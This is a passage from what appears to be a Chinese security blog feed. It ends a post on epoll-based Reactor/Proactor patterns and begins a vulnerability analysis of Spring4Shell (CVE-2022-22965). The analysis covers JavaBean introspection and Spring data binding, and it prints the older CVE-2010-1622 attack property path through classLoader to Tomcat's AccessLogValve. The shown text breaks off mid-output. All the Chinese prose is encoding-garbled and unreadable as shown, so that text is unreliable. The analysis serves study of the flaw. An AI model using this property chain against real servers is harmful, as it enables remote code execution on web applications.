<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002645.png" alt="image-20220505213405420" /></p>

<h4 id="åŒæ­¥æ–¹å¼çš„proactor">åŒæ­¥æ–¹å¼çš„Proactor</h4>

<p>ä¸Šè¿°æ‰€è¯´çš„Proactoræ¨¡å¼éœ€è¦å¼‚æ­¥I/Oæ¥å£ï¼Œä¸‹è¿°ä½¿ç”¨åŒæ­¥æ–¹å¼æ¨¡æ‹Ÿï¼š</p>

<ol>
  <li>ä¸»çº¿ç¨‹å¾€ epoll å†…æ ¸äº‹ä»¶è¡¨ä¸­æ³¨å†Œ socket ä¸Šçš„è¯»å°±ç»ªäº‹ä»¶ã€‚</li>
  <li>ä¸»çº¿ç¨‹è°ƒç”¨ epoll_wait ç­‰å¾… socket ä¸Šæœ‰æ•°æ®å¯è¯»ã€‚</li>
  <li>å½“ socket ä¸Šæœ‰æ•°æ®å¯è¯»æ—¶ï¼Œepoll_wait é€šçŸ¥ä¸»çº¿ç¨‹ã€‚ä¸»çº¿ç¨‹ä» socket å¾ªç¯è¯»å–æ•°æ®ï¼Œç›´åˆ°æ²¡æœ‰æ›´
å¤šæ•°æ®å¯è¯»ï¼Œç„¶åå°†è¯»å–åˆ°çš„æ•°æ®å°è£…æˆä¸€ä¸ªè¯·æ±‚å¯¹è±¡å¹¶æ’å…¥è¯·æ±‚é˜Ÿåˆ—ã€‚</li>
  <li>ç¡çœ åœ¨è¯·æ±‚é˜Ÿåˆ—ä¸Šçš„æŸä¸ªå·¥ä½œçº¿ç¨‹è¢«å”¤é†’ï¼Œå®ƒè·å¾—è¯·æ±‚å¯¹è±¡å¹¶å¤„ç†å®¢æˆ·è¯·æ±‚ï¼Œç„¶åå¾€ epoll å†…æ ¸äº‹
ä»¶è¡¨ä¸­æ³¨å†Œ socket ä¸Šçš„å†™å°±ç»ªäº‹ä»¶ã€‚</li>
  <li>ä¸»çº¿ç¨‹è°ƒç”¨ epoll_wait ç­‰å¾… socket å¯å†™ã€‚</li>
  <li>å½“ socket å¯å†™æ—¶ï¼Œepoll_wait é€šçŸ¥ä¸»çº¿ç¨‹ã€‚ä¸»çº¿ç¨‹å¾€ socket ä¸Šå†™å…¥æœåŠ¡å™¨å¤„ç†å®¢æˆ·è¯·æ±‚çš„ç»“æœã€‚</li>
</ol>

<p>åŒæ­¥ I/O æ¨¡æ‹Ÿ Proactor æ¨¡å¼çš„å·¥ä½œæµç¨‹ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/05/20220508002642.png" alt="image-20220506142214571" /></p>

<p>Reactor æ¨¡å¼å’ŒProactor æ¨¡å¼çš„ä¸»è¦åŒºåˆ«åœ¨äºï¼šå¯¹äºå·¥ä½œçº¿ç¨‹è€Œè¨€ï¼ŒReactor å‘æ¥çš„æ˜¯å·²å°±ç»ªçš„è¯»å†™äº‹ä»¶ï¼Œè€ŒProactor å‘æ¥çš„æ˜¯å·²ç»å®Œæˆçš„è¯»å†™äº‹ä»¶ï¼ˆå¼‚æ­¥I/Oçš„å¤„ç†åœ¨å†…æ ¸ä¸­å®Œæˆï¼ŒåŒæ­¥I/Oåœ¨ä¸»çº¿ç¨‹è‡ªå·±å®ç°ï¼‰</p>]]></content><author><name>Theoyu</name></author><category term="cource" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">CVE-2022-22965 SpringFramework æ¼æ´åˆ†æ</title><link href="https://theoyu.top/2022/spring4shell" rel="alternate" type="text/html" title="CVE-2022-22965 SpringFramework æ¼æ´åˆ†æ" /><published>2022-04-10T00:00:00+08:00</published><updated>2022-04-10T00:00:00+08:00</updated><id>https://theoyu.top/2022/spring4shell</id><content type="html" xml:base="https://theoyu.top/2022/spring4shell"><![CDATA[<!--more-->

<h2 id="å‰è¨€">å‰è¨€</h2>

<p>è¿™ä¸ªæ´çˆ†å‘çš„ç¬¬äºŒå¤©ï¼Œåœ¨æ‹¿åˆ°expå¹¶å¤ç°æˆåŠŸåï¼Œå…¶å®å¿ƒé‡Œæ˜¯æƒ³ç€è¶çƒ­åº¦å‘ä¸€ä¸‹æ–‡ç« çš„ï¼Œä½†å®Œå®Œæ•´æ•´è·Ÿè¿›å®Œè¿™ä¸ªæ¼æ´åï¼Œæˆ‘å‘ç°æˆ‘ä¹Ÿåªæ˜¯åœç•™åœ¨ <em>å¤ç°</em> çš„å±‚é¢ä¸Šï¼Œè¿™ä¹Ÿè®©æˆ‘æ€è€ƒä¸€ä¸ªé—®é¢˜ï¼Œ<strong>å†™ä¸€ç¯‡æ¼æ´åˆ†æçš„æ–‡ç« ï¼Œéœ€è¦å…·å¤‡æ€æ ·çš„ç´ å…»ï¼Ÿ</strong></p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220408134504.png" alt="image-20220407174417845" /></p>

<p>è™½ç„¶ä½œä¸ºåˆå­¦è€…ï¼Œæ‰€è°“æ¼æ´åˆ†æå¤§å¤šéƒ½æ˜¯ç«™åœ¨å‰äººçš„è‚©è†€ä¸Šï¼Œä¸è¿‡è¿˜æ˜¯å¸Œæœ›å¯ä»¥å†™å‡ºä¸€äº›è‡ªå·±çš„ä¸œè¥¿ï¼Œè¸©çš„å‘ä¹Ÿå¥½ä¸€äº›æ— å…³ç—›ç—’çš„ç†è§£ä¹Ÿç½¢ã€‚å¸Œæœ›è¯»å®Œè¿™ç¯‡æ–‡ç« ï¼Œä½ å¯ä»¥åŸºæœ¬ä¸Šè§£ç­”ä»¥ä¸‹å‡ ä¸ªé—®é¢˜ï¼š</p>

<ol>
  <li>ä¸ºä»€ä¹ˆç‰ˆæœ¬éœ€è¦JDK9åŠä»¥ä¸Šï¼Œè€ŒJDK8ä¸è¡Œï¼Ÿ</li>
  <li>ä¸ºä»€ä¹ˆæ˜¯éœ€è¦Spring tomcat waréƒ¨ç½²æ–¹å¼ï¼ŒSpringboot jarä¼šå—å½±å“å—ï¼Ÿ</li>
  <li>æ¼æ´çš„å½±å“é¢å’Œåˆ©ç”¨æ–¹å¼æ˜¯ä»€ä¹ˆï¼Œæ–°çš„PATCHåˆæ˜¯å¦‚ä½•ä¿®å¤çš„ï¼Ÿ</li>
</ol>

<p>å¸¦ç€è¿™ä¸‰ä¸ªé—®é¢˜ï¼Œè®©æˆ‘ä»¬èµ°è¿›spring4shellã€‚</p>

<h2 id="javabeanä¸springbean">JavaBeanä¸SpringBean</h2>

<p>ä»€ä¹ˆæ˜¯JavaBeanå‘¢ï¼Ÿ</p>

<p>JavaBeanåœ¨è¯­æ³•ä¸Šå’Œç±»æ²¡æœ‰åŒºåˆ«ï¼Œå…¶å†…éƒ¨æ²¡æœ‰ç‰¹å®šçš„åŠŸèƒ½æ–¹æ³•ï¼Œä¸»è¦åŒ…å«ä¿¡æ¯å­—æ®µå’Œå­˜å‚¨æ–¹æ³•ï¼Œå¦‚æœä¸€ä¸ªç±»éµä»äº†ä»¥ä¸‹JavaBeançš„æ ‡å‡†ï¼Œé‚£ä¹ˆå®ƒå°±æ˜¯ä¸€ä¸ªJavaBeanï¼š</p>

<ol>
  <li>æ‰€æœ‰å±æ€§ä¸º<code class="language-plaintext highlighter-rouge">private</code>ã€‚</li>
  <li>ç±»å£°æ˜ä¸º<code class="language-plaintext highlighter-rouge">public</code>ï¼Œæä¾›é»˜è®¤çš„æ— å‚æ„é€ æ–¹æ³•ã€‚</li>
  <li>æä¾›<code class="language-plaintext highlighter-rouge">setter&amp;getter</code>æ–¹æ³•ï¼Œè®©å¤–éƒ¨å¯ä»¥<code class="language-plaintext highlighter-rouge">è®¾ç½®&amp;è·å–</code>JavaBeançš„å±æ€§ã€‚</li>
</ol>

<p>åŒæ—¶ï¼ŒJavaBeanå¯¹å…¶æ–¹æ³•å’Œå±æ€§çš„å‘½åæœ‰ä¸€å®šè¦æ±‚ï¼Œå»æ‰<code class="language-plaintext highlighter-rouge">setter&amp;getter</code>æ–¹æ³•çš„å‰ç¼€ï¼Œå‰©ä¸‹éƒ¨åˆ†å°±æ˜¯å±æ€§å(å°å†™)ã€‚</p>

<p>åœ¨ideaä¸­å°±æ”¯æŒè‡ªåŠ¨æ ¹æ®å±æ€§å¡«å……<code class="language-plaintext highlighter-rouge">setter&amp;getter</code>ï¼Œå®ç°ä¸€ä¸ªç®€å•çš„JavaBeanã€‚</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220420125751.png" alt="image-20220420115200100" /></p>

<p>å¦‚æœä½ ä¹‹å‰å¯¹SpringMVCæ²¡æœ‰ä»»ä½•äº†è§£çš„è¯ï¼Œå»ºè®®æ‰‹åŠ¨æ­å»ºä¸€ä¸‹ç›¸å…³<a href="https://theoyu.top/2022/04/06/springMVC01.html#%E9%80%9A%E8%BF%87%E5%AE%9E%E4%BD%93-bean-%E6%8E%A5%E6%94%B6%E8%AF%B7%E6%B1%82%E5%8F%82%E6%95%B0">ç¯å¢ƒ</a>ï¼Œåœ¨è¿™ä¸ªæ§åˆ¶å™¨é‡Œæˆ‘ä»¬å°±é€šè¿‡JavaBeanæ¥æ”¶è¯·æ±‚å‚æ•°ï¼š</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/login5"</span><span class="o">)</span>
<span class="kd">public</span> <span class="nc">String</span> <span class="nf">login5</span><span class="o">(</span><span class="nc">User</span> <span class="n">user</span><span class="o">,</span> <span class="nc">Model</span> <span class="n">model</span><span class="o">){</span>
    <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"name"</span><span class="o">,</span><span class="n">user</span><span class="o">.</span><span class="na">getUsername</span><span class="o">());</span>
    <span class="k">return</span> <span class="s">"login"</span><span class="o">;</span>
<span class="o">}</span>
</code></pre></div></div>

<p>å‘é€ä»¥ä¸‹è¯·æ±‚ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421175428.png" alt="image-20220420104726972" /></p>

<p>å¯ä»¥çœ‹åˆ°SpringMVCè‡ªåŠ¨æŠŠGETä¼ å…¥çš„å‚æ•°æ³¨å…¥åˆ°äº†beanå¯¹è±¡ä¸­ã€‚</p>

<p>å¯¹å‘½åè§„åˆ™æœ‰å¦‚æ­¤è¦æ±‚çš„å¥½å¤„åœ¨äºï¼Œå½“ä¸€ä¸ªç±»è¢«å½“ä½œJavaBeanä½¿ç”¨æ—¶ï¼Œå³ä½¿å…¶å†…éƒ¨ç§æœ‰å±æ€§æ— æ³•è¢«è®¿é—®ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ–¹æ³•åæ¨æ–­å‡ºæ¥ï¼Œé‚£ä¹ˆ <strong>å°±å¯ä»¥é€šè¿‡åå°„è‡ªåŠ¨æ³¨å…¥åˆ°å…¶å±æ€§ä¸­</strong> ã€‚</p>

<p>Java æ ¸å¿ƒåº“æä¾›çš„<code class="language-plaintext highlighter-rouge">Introspector</code>å°±å¯ä»¥è·å–ä¸€ä¸ªJavaBeançš„æ‰€æœ‰å±æ€§ä»¥åŠå¯¹åº”å±æ€§çš„è¯»å†™æ–¹æ³•ï¼Œä¹Ÿç§°ä¸ºå†…çœã€‚</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span>  <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="nc">BeanInfo</span> <span class="n">info</span> <span class="o">=</span> <span class="nc">Introspector</span><span class="o">.</span><span class="na">getBeanInfo</span><span class="o">(</span><span class="nc">User</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="k">for</span> <span class="o">(</span><span class="nc">PropertyDescriptor</span> <span class="n">pd</span> <span class="o">:</span> <span class="n">info</span><span class="o">.</span><span class="na">getPropertyDescriptors</span><span class="o">())</span> <span class="o">{</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[Property]"</span><span class="o">+</span><span class="n">pd</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"  [ReadMethod]"</span> <span class="o">+</span> <span class="n">pd</span><span class="o">.</span><span class="na">getReadMethod</span><span class="o">());</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"  [WriteMethod]"</span> <span class="o">+</span> <span class="n">pd</span><span class="o">.</span><span class="na">getWriteMethod</span><span class="o">());</span>
        <span class="o">}</span>
    <span class="o">}</span>

    <span class="kd">public</span> <span class="kd">class</span> <span class="nc">User</span> <span class="o">{</span>
        <span class="kd">private</span> <span class="nc">String</span> <span class="n">username</span><span class="o">;</span>
        <span class="kd">private</span> <span class="nc">String</span> <span class="n">password</span><span class="o">;</span>

        <span class="kd">public</span> <span class="nc">String</span> <span class="nf">getUsername</span><span class="o">()</span> <span class="o">{</span>
            <span class="k">return</span> <span class="n">username</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setUsername</span><span class="o">(</span><span class="nc">String</span> <span class="n">username</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">username</span> <span class="o">=</span> <span class="n">username</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="kd">public</span> <span class="nc">String</span> <span class="nf">getPassword</span><span class="o">()</span> <span class="o">{</span>
            <span class="k">return</span> <span class="n">password</span><span class="o">;</span>
        <span class="o">}</span>

        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">setPassword</span><span class="o">(</span><span class="nc">String</span> <span class="n">password</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">this</span><span class="o">.</span><span class="na">password</span> <span class="o">=</span> <span class="n">password</span><span class="o">;</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="o">}</span>
</code></pre></div></div>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421175434.png" alt="image-20220420130721427" /></p>

<p>åœ¨è¾“å‡ºçš„ç»“æœä¸­ï¼Œåä¸¤è€…æ˜¯æˆ‘ä»¬é¢„æƒ³èŒƒå›´å†…çš„ï¼Œä½†æ˜¯è¿™ä¸ªclasså±æ€§æ˜¯æ€ä¹ˆæ¥çš„å‘¢ï¼Ÿ</p>

<p>åŸå› åœ¨äºåœ¨Javaä¸­ï¼Œæ‰€æœ‰ç±»éƒ½ä¼šç»§æ‰¿äº<code class="language-plaintext highlighter-rouge">Object</code>ç±»ï¼Œè€Œåœ¨<code class="language-plaintext highlighter-rouge">Object</code>ä¸­åˆå­˜åœ¨<code class="language-plaintext highlighter-rouge">getClass()</code>æ–¹æ³•ï¼Œç”±äºå†…çœæœºåˆ¶å°±ä¼šè®¤ä¸ºå­˜åœ¨ä¸€ä¸ªclasså±æ€§ã€‚</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421175437.png" alt="image-20220420131236499" /></p>

<p>å¯ä»¥æ‹¿åˆ°classå±æ€§ï¼Œä¸è¿‡å¥½åœ¨classå±æ€§å¹¶æ²¡æœ‰<code class="language-plaintext highlighter-rouge">WriteMethod</code>ï¼Œå³æ²¡æœ‰setæ–¹æ³•å»è®¾ç½®å…¶å€¼ï¼Œæ‰€ä»¥è¿™ä¹Ÿä¸ç®—æ˜¯ä¸€ä¸ªä¸¥å³»çš„é—®é¢˜ã€‚</p>

<p>èµ°åˆ°è¿™ï¼Œæˆ‘ä»¬æœ‰å¿…è¦èµ°è¿›SpringMVCæ•°æ®ç»‘å®šçš„æ­¥éª¤ï¼Œåœ¨ä¸Šè¿°çš„å‚æ•°ç»‘å®šè¿‡ç¨‹ï¼Œä¸»è¦å‘ç”Ÿåœ¨ä¸‹å›¾çš„ç¬¬äº”æ­¥ä¸­ã€‚</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220412155730.png" alt="image-20220410141300306" /></p>

<p>æˆ‘ä»¬ä¸ä¸€ä¸€å±•å¼€è°ƒç”¨é“¾ï¼ŒæŒ‘å‡ ä¸ªå…³é”®ç±»ã€æ–¹æ³•åˆ†æï¼š</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">org.springframework.beans.AbstractNestablePropertyAccessor</code></li>
</ul>

<p>JavaBeançš„æ ¸å¿ƒå¤„ç†æŠ½è±¡ç±»ï¼ŒåŒ…å«setã€getç­‰å¤„ç†é€»è¾‘å®ç°ä»¥åŠ <strong>åµŒå¥—å±æ€§</strong> çš„å¤„ç†ã€‚</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421175441.png" alt="image-20220421160055832" /></p>

<p>ä»è¿™ä¸ªæ–¹æ³•æ‰€å¼•ç”³çš„å‡ ä¸ªæ–¹æ³•ä¸»è¦æ˜¯è§£å†³äº†é€’å½’è°ƒç”¨çš„é—®é¢˜ï¼Œæ¯”å¦‚å¦‚æœæˆ‘åœ¨javaä¸­æƒ³è°ƒç”¨<code class="language-plaintext highlighter-rouge">user.getInfo().getAge()</code>ï¼Œé‚£ä¹ˆä¼ å…¥çš„å‚æ•°å°±ä¸º<code class="language-plaintext highlighter-rouge">user.info.age</code>ï¼Œåœ¨è§£ææµç¨‹ä¸­ä¼šå¯¹<code class="language-plaintext highlighter-rouge">.</code>è¿›è¡Œäº†åˆ†å‰²è¯†åˆ«ï¼Œå¹¶é€’å½’è¿”å›è°ƒç”¨å¯¹è±¡ã€‚</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">org.springframework.beans.CachedIntrospectionResults</code>ï¼š</li>
</ul>

<p>ç¼“å­˜äº†JavaBeançš„ä¿¡æ¯ï¼Œä¹‹åéœ€è¦ä½¿ç”¨å¯ä»¥ç›´æ¥ä»è¿™è·å–ã€‚å†…éƒ¨ä½¿ç”¨äº†<code class="language-plaintext highlighter-rouge">Introspector.getBeanInfo(beanClass)</code>è¿›è¡Œäº†å­˜å‚¨ï¼Œè¿™æˆ‘ä»¬å¯ä¸é™Œç”Ÿï¼Œä¹Ÿæ­£æ˜¯å› ä¸ºç¼“å­˜çš„å­˜åœ¨ï¼Œåœ¨ä¸Šè¿°ä¾‹å­ä¸­å³ä½¿ <strong>info</strong>ï¼Œ<strong>age</strong>éƒ½æ˜¯ç§æœ‰å±æ€§ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡å†…çœæœºåˆ¶è®¿é—®åˆ°ã€‚</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">org.springframework.beans.BeanWrapperImpl</code>ï¼š</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">BeanWrapper</code>æ¥å£çš„å®ç°ç±»å’ŒæŠ½è±¡ç±»<code class="language-plaintext highlighter-rouge">AbstractNestablePropertyAccessor</code>çš„å­ç±»ï¼Œå…¶å¯¹JavaBeanè¿›è¡Œäº†å°è£…ï¼Œå…¶<code class="language-plaintext highlighter-rouge">setValue</code>æ–¹æ³•é€šè¿‡åå°„å®Œæˆäº†æœ€ç»ˆçš„å±æ€§æ³¨å…¥ã€‚</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421175444.png" alt="image-20220421161153787" /></p>

<p>æ€»ç»“ä»¥ä¸Šä¸‰ç‚¹ï¼Œç›®å‰æˆ‘ä»¬å¾—çŸ¥çš„å†…å®¹ä¸ºï¼š</p>

<ol>
  <li><code class="language-plaintext highlighter-rouge">CachedIntrospectionResults</code>ç¼“å­˜ä¸­ä½¿ç”¨<code class="language-plaintext highlighter-rouge">Introspector.getBeanInfo(beanClass)</code>è¿›è¡Œäº†å­˜å‚¨ï¼Œä½¿å¾—æˆ‘ä»¬å¯ä»¥é€šè¿‡å†…çœæœºåˆ¶è®¿é—®ç§æœ‰å±æ€§ï¼Œå¹¶ä¸”ç”±äºç±»ç»§æ‰¿æˆ‘ä»¬å¯ä»¥æ‹¿åˆ°classå±æ€§ã€‚</li>
  <li><code class="language-plaintext highlighter-rouge">AbstractNestablePropertyAccessor</code>ä¸­å¯é€’å½’å¤„ç†è¯·æ±‚ï¼Œå’Œå†…çœæœºåˆ¶ç»“åˆå¯è¶Šè¿‡å‰é¢ä¸å­˜åœ¨setæ–¹æ³•çš„å±æ€§ã€‚</li>
  <li><code class="language-plaintext highlighter-rouge">BeanWrapperImpl.setValue()</code>å¯é€šè¿‡åå°„å¯¹ä¸€ä¸ªå­˜åœ¨setæ–¹æ³•çš„å±æ€§è®¾ç½®å…¶å€¼ã€‚</li>
</ol>

<p>å…¶å®ç°åœ¨ï¼Œæˆ‘ä»¬çš„æ„å›¾å·²ç»å¾ˆæ˜æ˜¾äº†ï¼Œå³ä½¿classå±æ€§ä¸å­˜åœ¨<code class="language-plaintext highlighter-rouge">WriteMethod</code>ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡å†…çœå’Œé€’å½’è°ƒç”¨çš„æœºåˆ¶ï¼Œä»classå±æ€§ä¸€è·¯å»¶ä¼¸ï¼Œé€šè¿‡<code class="language-plaintext highlighter-rouge">class.xxx.xxx.xxx</code>ï¼Œæ‰¾åˆ°ä¸€ä¸ªå¯ä»¥åˆ©ç”¨çš„å±æ€§ã€‚</p>

<h2 id="cve-2010-1622æ˜¯å¦‚ä½•åšçš„">CVE-2010-1622æ˜¯å¦‚ä½•åšçš„ï¼Ÿ</h2>

<p>åœ¨<code class="language-plaintext highlighter-rouge">CachedIntrospectionResults</code>çš„æ„é€ æ–¹æ³•ä¸­ï¼Œæœ‰ä¸€ä¸ªå¾ˆæ˜æ˜¾çš„é»‘åå•ï¼š</p>

<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2022/04/20220421175450.png" alt="image-20220421163405170" /></p>

<p>ç›¸å½“äºå¦‚æœè°ƒç”¨<code class="language-plaintext highlighter-rouge">class.classLoader</code>åˆ™ä¼šè¢«ç›´æ¥æ‹¦æˆªã€‚</p>

<p>è¿™ä¹Ÿæ‹‰å¼€äº†CVE-2022-22965çš„å‰èº«çš„åºå¹•ï¼šCVE-2010-1622 SpringMVCæ¡†æ¶ä»»æ„ä»£ç æ‰§è¡Œæ¼æ´ã€‚</p>

<p>æˆ‘ä»¬æŠŠç›®å…‰æ”¾åœ¨12å¹´å‰ï¼ŒclassLoaderè¿˜æ²¡æœ‰æ”¾å…¥é»‘åå•ï¼Œæˆ‘ä»¬æ˜¯å¦‚ä½•åˆ©ç”¨çš„ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">class.classLoader.resources.context.parent.pipeline.first</code></p>

<p>å…¶ä¸­ï¼š</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">context</code>å¯¹åº”<code class="language-plaintext highlighter-rouge">StandardContext</code></li>
  <li><code class="language-plaintext highlighter-rouge">parent</code>å¯¹åº”<code class="language-plaintext highlighter-rouge">StandardHost</code></li>
  <li><code class="language-plaintext highlighter-rouge">pipeline</code>å¯¹åº”<code class="language-plaintext highlighter-rouge">StandardPipeline</code></li>
  <li><code class="language-plaintext highlighter-rouge">first</code>å¯¹åº”<code class="language-plaintext highlighter-rouge">AccessLogValve</code></li>
</ul>

<p>åœ¨<code class="language-plaintext highlighter-rouge">org.apache.catalina.valves.AccessLogValve</code>ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°è®¸å¤šå­˜åœ¨setæ–¹æ³•çš„å±æ€§ï¼š</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span>  <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">Exception</span> <span class="o">{</span>
        <span class="nc">BeanInfo</span> <span class="n">info</span> <span class="o">=</span> <span class="nc">Introspector</span><span class="o">.</span><span class="na">getBeanInfo</span><span class="o">(</span><span class="nc">AccessLogValve</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="k">for</span> <span class="o">(</span><span class="nc">PropertyDescriptor</span> <span class="n">pd</span> <span class="o">:</span> <span class="n">info</span><span class="o">.</span><span class="na">getPropertyDescriptors</span><span class="o">())</span> <span class="o">{</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"[Property]"</span><span class="o">+</span><span class="n">pd</span><span class="o">.</span><span class="na">getName</span><span class="o">());</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"  [ReadMethod]"</span> <span class="o">+</span> <span class="n">pd</span><span class="o">.</span><span class="na">getReadMethod</span><span class="o">());</span>
            <span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"  [WriteMethod]"</span> <span class="o">+</span> <span class="n">pd</span><span class="o">.</span><span class="na">getWriteMethod</span><span class="o">());</span>
        <span class="o">}</span>
    <span class="o">}</span>
<span class="c1">//è¾“å‡ºï¼š</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">asyncSupported</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">boolean</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">ValveBase</span><span class="o">.</span><span class="na">isAsyncSupported</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">ValveBase</span><span class="o">.</span><span class="na">setAsyncSupported</span><span class="o">(</span><span class="kt">boolean</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">buffered</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">boolean</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">isBuffered</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">setBuffered</span><span class="o">(</span><span class="kt">boolean</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">checkExists</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">boolean</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">isCheckExists</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kt">void</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AccessLogValve</span><span class="o">.</span><span class="na">setCheckExists</span><span class="o">(</span><span class="kt">boolean</span><span class="o">)</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="kd">class</span>
  <span class="err">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="kd">final</span> <span class="kd">native</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Class</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Object</span><span class="o">.</span><span class="na">getClass</span><span class="o">()</span>
  <span class="o">[</span><span class="nc">WriteMethod</span><span class="o">]</span><span class="kc">null</span>
<span class="o">[</span><span class="nc">Property</span><span class="o">]</span><span class="n">condition</span>
  <span class="o">[</span><span class="nc">ReadMethod</span><span class="o">]</span><span class="kd">public</span> <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">catalina</span><span class="o">.</span><span class="na">valves</span><span class="o">.</span><span class="na">AbstractAccessLogValve</span><span class="o">.</span><span class="na">getCondition</span><span class="o">()</span>
